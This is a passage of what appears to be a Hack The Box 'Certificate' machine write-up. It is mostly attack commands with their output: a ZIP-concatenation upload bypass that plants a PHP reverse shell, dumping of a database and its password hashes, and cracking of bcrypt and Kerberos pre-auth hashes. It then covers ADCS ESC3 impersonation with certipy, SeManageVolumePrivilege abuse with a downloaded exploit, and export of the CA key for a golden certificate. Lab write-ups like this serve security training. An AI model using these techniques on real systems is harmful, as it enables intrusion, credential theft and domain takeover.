- Concatenate the malicious and benign archives to produce a single uploadable ZIP:

```bash
cat malicious.zip benign.zip > shell.zip
```


```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ echo "hello world" > newfile.txt
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ pandoc newfile.txt  -o normal.pdf
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ zip benign.zip normal.pdf
  adding: normal.pdf (deflated 2%)
                                                                                                   
                                                                                                   
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2/malicious_files]
└─$ nano normal.php
                                                                                                                                                                  
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ zip malicious.zip normal.php 
  adding: normal.php (deflated 54%)
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ cat benign.zip malicious.zip > shell.zip
                                                                                                                                                       
```


Upload `shell.zip` and set up a listener:

```
nc -lvnp 4444
```

After submitting the .zip file, click on the HERE link.


<img src="/assets/HTB/Certificate/image6.png" alt="Error loading image">

A URL will look like:

```
http://certificate.htb/static/uploads/67db7d1b1b004bcdb4f6a514edd6fca8/normal.pdf
```

Change it to:

```
http://certificate.htb/static/uploads/67db7d1b1b004bcdb4f6a514edd6fca8/normal.php
```

Send a request through curl:

```
curl http://certificate.htb/static/uploads/67db7d1b1b004bcdb4f6a514edd6fca8/normal.php
```

And we get a session:


```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ nc -lvnp  1337
listening on [any] 1337 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.71] 57868

PS C:\xampp\htdocs\certificate.htb\static\uploads\67db7d1b1b004bcdb4f6a514edd6fca8> whoami
certificate\xamppuser
PS C:\xampp\htdocs\certificate.htb\static\uploads\67db7d1b1b004bcdb4f6a514edd6fca8>         
```

Under `C:\xampp\htdocs\certificate.htb` we have a `db.php` file.


```
PS C:\xampp\htdocs\certificate.htb> ls


    Directory: C:\xampp\htdocs\certificate.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/26/2024   1:49 AM                static                                                                
-a----       12/24/2024  12:45 AM           7179 about.php                                                             
-a----       12/30/2024   1:50 PM          17197 blog.php                                                              
-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          
-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    
-a----       12/24/2024  12:53 AM           4632 courses.php                                                           
-a----       12/23/2024   4:46 AM            549 db.php                                                                
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    
-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      
-a----       12/22/2024  10:16 AM           2955 footer.php                                                            
-a----       12/23/2024   5:13 AM           2351 header.php                                                            
-a----       12/24/2024  12:52 AM           9497 index.php                                                             
-a----       12/25/2024   1:34 PM           5908 login.php                                                             
-a----       12/23/2024   5:14 AM            153 logout.php                                                            
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              
-a----       12/25/2024   1:27 PM           8240 register.php                                                          
-a----       12/28/2024  11:26 PM          10366 upload.php                                                            


PS C:\xampp\htdocs\certificate.htb> type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
PS C:\xampp\htdocs\certificate.htb> 

```

The credentials are for the MySQL database. To connect we need the MySQL client/binary.

- **Username:** certificate_webapp_user  
- **Password:** cert!f!c@teDBPWD

### Database Access and Hash Cracking

Under `C:\xampp\mysql\bin\` we have `mysql.exe`.


**Databases**

```
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db;
```
```

PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "SHOW DATABASES;"
Database
certificate_webapp_db
information_schema
test

```

**Table in certificate_webapp_db**

```
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db; SHOW TABLES;"
```
```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db; SHOW TABLES;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses

```
**User Table Structure**

```
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db; DESCRIBE users;"
```
```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db; DESCRIBE users;"
Field   Type    Null    Key     Default Extra
id      int(11) NO      PRI     NULL    auto_increment
first_name      varchar(50)     NO              NULL
last_name       varchar(50)     NO              NULL
username        varchar(50)     NO      UNI     NULL
email   varchar(50)     NO      UNI     NULL
password        varchar(255)    NO              NULL
created_at      timestamp       YES             current_timestamp()
role    enum('student','teacher','admin')       YES             NULL
is_active       tinyint(1)      NO              1
PS C:\xampp\mysql\bin> 

```

**Formated hashes and username**
```
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db; SELECT username,password FROM users LIMIT 8;"
```
```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -h 127.0.0.1 -e "USE certificate_webapp_db; SELECT username,password FROM users LIMIT 8;"
username        password
Lorra.AAA       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200        $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney  $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev    $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
testSTAFF@gmail.com     $2y$04$4rbQQnNiRwaLplx0dTLtOOSobeoVhy7ihgq6cTZb4Vw0UgVo0by4i
test@gmail.com  $2y$04$fT71xs6tv/2yCgMiSDQLZ.IdykNim5IV6ctrOvbxWdYLpU5ZhoG/G
PS C:\xampp\mysql\bin>
```

**Hash Cracking**

After cracking, we successfully recovered the password for user `sara.b`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
```

```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ echo '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6' > sara_hash
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt sara_hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)     
1g 0:00:00:01 DONE (2025-06-01 14:31) 0.6849g/s 8383p/s 8383c/s 8383C/s delboy..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

- **Username:** sara.b  
- **Password:** Blink182

## Access as Sara

Valid credentials for `sara.b` were confirmed via WinRM:

```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ nxc winrm 10.10.11.71 -u sara.b -p Blink182
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)
                                                     
```

Before logging in as sara.b, data collection for Active Directory enumeration was performed:

```
bloodhound-python -dc dc01.certificate.htb  -u 'sara.b' -p 'Blink182' -d certificate.htb -c All --zip -ns 10.10.11.71
```


Connected to `sara.b` and found a `WS-01` folder in **Documents** containing `Description.txt` and a packet capture:

```
evil-winrm -i 10.10.11.71 -u sara.b -p 'Blink182'                               
```
```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ evil-winrm -i 10.10.11.71 -u sara.b -p 'Blink182'                               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> ls


    Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01


*Evil-WinRM* PS C:\Users\Sara.B\Documents> cd WS-01
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> ls


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap


*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
                                        
Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> exit
                                        
Info: Exiting with code 0

```

### Parsing Kerberos pre-auth data

The `Description.txt` contains the following notification:

```
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ cat Description.txt 
��The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

After opening the capture in Wireshark we found SMB packets and several Kerberos packets (AS-REQ, AS-REP and TGS-REP).

<img src="/assets/HTB/Certificate/image11.png" alt="Error loading image">

The capture contains Kerberos pre-authentication data that can be extracted for offline password cracking. To parse Kerberos packets from the .pcap and generate crackable hashes we used:

#### [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)

**Tool Description:** Krb5RoastParser is a tool designed to parse Kerberos authentication packets (AS-REQ, AS-REP and TGS-REP) from .pcap files and generate password-cracking-compatible hashes for security testing. By leveraging tshark, Krb5RoastParser extracts necessary details from Kerberos packets, providing hash formats ready for tools like Hashcat.


After parsing the PCAP we extracted a Kerberos pre-auth hash for user `lion.sk`:

```
                                         
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2/Krb5RoastParser]
└─$ python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2/Krb5RoastParser]
└─$ 

```

Hash cracking (hashcat):

```
$krb5pa$18$Lion.SK$CERTIFICATE$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

```
hashcat -m 19900 krb_hash /usr/share/wordlists/rockyou.txt
```

**Credentials found**

- **Username:**  lion.sk
- **Password:** !QAZ2wsx

## Access a lion.sk

Using `nxc` we validated the cracked credentials against the target:
```
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$  nxc smb 10.10.11.71 -u lion.sk -p '!QAZ2wsx'
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certifite.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [+] certificate.htb\lion.sk:!QAZ2wsx 
```

And confirmed WinRM access:

``` 
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$  nxc winrm 10.10.11.71 -u lion.sk -p '!QAZ2wsx'
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificatetb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptogphy.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\lion.sk:!QAZ2wsx (Pwn3d!)
                                        
```

and we are abe to smn and winrm

```
evil-winrm -i 10.10.11.71 -u lion.sk -p !QAZ2wsx

```

```                                                                                                                                  
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2]
└─$ evil-winrm -i 10.10.11.71 -u lion.sk -p !QAZ2wsx                                       
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> type ..\Desktop\user.txt
************9aaefa2c06950c8debb
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> 
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
                                    
```


## ADCS ESC 3 From lion.sk -> ryan

Viewing BloodHound shows `lion.sk` is a member of three groups — the interesting one is **Domain CRA Managers**.

### Enumeration

<img src="/assets/HTB/Certificate/image10.png" alt="Error loading image">


We ran `certipy find` as `lion.sk` and discovered a user-enrollable template (`Delegated-CRA`) with the **Certificate Request Agent** EKU, flagged as **ESC3** — indicating an ADCS ESC3 attack path is possible.



```
certipy find -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout  -vulnerable                             
```
```
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
                                                                                         
```


For ESC3 we `require` `2 certificate templates` with the following configuration

- Template 1: Provides Enrollment Agent Certificate
– **Certificate Request Agent EKU** --> 1.3.6.1.4.1.311.20.2.1 is enabled.
– **Enrollment Rights** are enabled for a user that we control.
- Template 2: Allows Enrollment Agent Certificate to use on-behalf-of
– **Client Authentication EKU** --> 1.3.6.1.5.5.7.3.2 is enabled.
– **Application Policy Issuance Requirement** with **Authorized Signatures Required** enabled and set to 1 along with Certificate Request Agent EKU enabled.
– **Enrollment Rights** are enabled for a user that we control.



After reviewing users in BloodHound, none were immediately interesting, but we identified **ryan** as a member of **Domain Storage Managers**. We will target `ryan` and proceed with the ESC3 (Certificate Request Agent EKU) attack path.


<img src="/assets/HTB/Certificate/image12.png" alt="Error loading image">

### ESC3 Abuse

Requests a certificate for the current user (lion.sk) using a vulnerable template (Delegated-CRA) that allows certificate delegation.

```
certipy-ad req -u 'lion.sk@certificate.htb' \        
            -p '!QAZ2wsx' \
            -dc-ip '10.10.11.71' \
            -target 'dc01.certificate.htb' \
            -ca 'Certificate-LTD-CA' \
            -template 'Delegated-CRA'
```
```
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ certipy-ad req -u 'lion.sk@certificate.htb' \        
            -p '!QAZ2wsx' \
            -dc-ip '10.10.11.71' \
            -target 'dc01.certificate.htb' \
            -ca 'Certificate-LTD-CA' \
            -template 'Delegated-CRA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'

```
Requests a certificate on behalf of RYAN.K using the SignedUser template and saves it as lion.sk.pfx.

```
certipy-ad req \
  -u 'lion.sk@certificate.htb' \
  -p '!QAZ2wsx' \
  -dc-ip '10.10.11.71' \
  -target 'dc01.certificate.htb' \
  -ca 'Certificate-LTD-CA' \
  -template 'SignedUser' \
  -pfx 'lion.sk.pfx' \
  -on-behalf-of 'CERTIFICATE\RYAN.K'
```
```
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ certipy-ad req \
  -u 'lion.sk@certificate.htb' \
  -p '!QAZ2wsx' \
  -dc-ip '10.10.11.71' \
  -target 'dc01.certificate.htb' \
  -ca 'Certificate-LTD-CA' \
  -template 'SignedUser' \
  -pfx 'lion.sk.pfx' \
  -on-behalf-of 'CERTIFICATE\RYAN.K'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'RYAN.K@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'

```
Authenticates as RYAN.K using the previously obtained certificate ryan.k.pfx.

```
certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
```

```                                                                                                                                                  
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ sudo ntpdate 10.10.11.71 &&certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
  
2025-10-05 10:54:05.132405 (-0400) +542.583734 +/- 0.092811 10.10.11.71 s1 no-leap
CLOCK: time stepped by 542.583734
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'RYAN.K@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6                                    
```

Verified WinRM access to `ryan.k` using the exported hash:

```
┌──(kali㉿kali)-[~/HTB/Certificate]
└─$ netexec winrm 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\ryan.k:b1bc3d70e70f4f36b1509a65ae1a2ae6 (Pwn3d!)
WINRM       10.10.11.71     5985   DC01             [-] certificate.htb\ryan.k:b1bc3d70e70f4f36b1509a65ae1a2ae6 zip() argument 2 is longer than argument 1
```

## SeManageVolumePrivilege Abuse -> Administrator

After logging in, we can see this user has an interesting privilege: `SeManageVolumePrivilege`.


```
┌──(kali㉿kali)-[~/HTB-machine/certificate/try2/Krb5RoastParser]
└─$ evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 

```


- [Microsoft Documentation – SeManageVolumePrivilege](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)

- A bit more explanation from xct's video:
  [xct Explanation (YouTube)](https://youtu.be/hzsGMj9C8Nw?t=2039)

- Using this GitHub repo because it contains a precompiled executable for abuse:
  [SeManageVolumeExploit (by CsEnox)](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)

#### Before running .exe

```
upload SeManageVolumeExploit.exe
```
List Access Control List flag (ACE)
```
icacls "C:\Users"
```

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> upload SeManageVolumeExploit.exe
                                        
Info: Uploading /home/kali/HTB-machine/certificate/try1/SeManageVolumeExploit.exe to C:\Users\Ryan.K\Documents\SeManageVolumeExploit.exe
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> icacls "C:\Users"
C:\Users NT AUTHORITY\SYSTEM:(OI)(CI)(F)
         BUILTIN\Administrators:(OI)(CI)(F)
         BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
         BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
         Everyone:(RX)
         Everyone:(OI)(CI)(IO)(GR,GE)
```

- OI = Object Inherit
- CI = Container Inherit
- IO = Inherit Only
- F = Full Control
- RX = Read and Execute
- GR = Generic Read
- GE = Generic Execute

**Point:**

SYSTEM has full access to everything inside C:\Users.

Administrators group has full access.

Everyone:(RX)	All users can read and execute inside C:\Users, but can't write.

#### After Running .exe

```
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
Entries changed: 845

DONE

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> icacls "C:\Users"
C:\Users NT AUTHORITY\SYSTEM:(OI)(CI)(F)
         BUILTIN\Users:(OI)(CI)(F)
         BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
         BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
         Everyone:(RX)
         Everyone:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
```

`BUILTIN\Users:(OI)(CI)(F)` — All normal users have Full Control over `C:\Users`


List all certificates in the "My" certificate store (also known as the Personal store) for the current user.


### Golden Certificate Attack

List all certificates in the My (Personal) certificate store for the current user:

```
certutil -store my
```
```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -store my
my "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
  Provider = Microsoft RSA SChannel Cryptographic Provider
Private key is NOT exportable
Encryption test passed

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
CertUtil: -store command completed successfully.
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 

```
Export the CA certificate (identified by its serial number) from the My store as a PFX file:

```
certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
```

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file ca_exported.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
```
```
download ca_exported.pfx
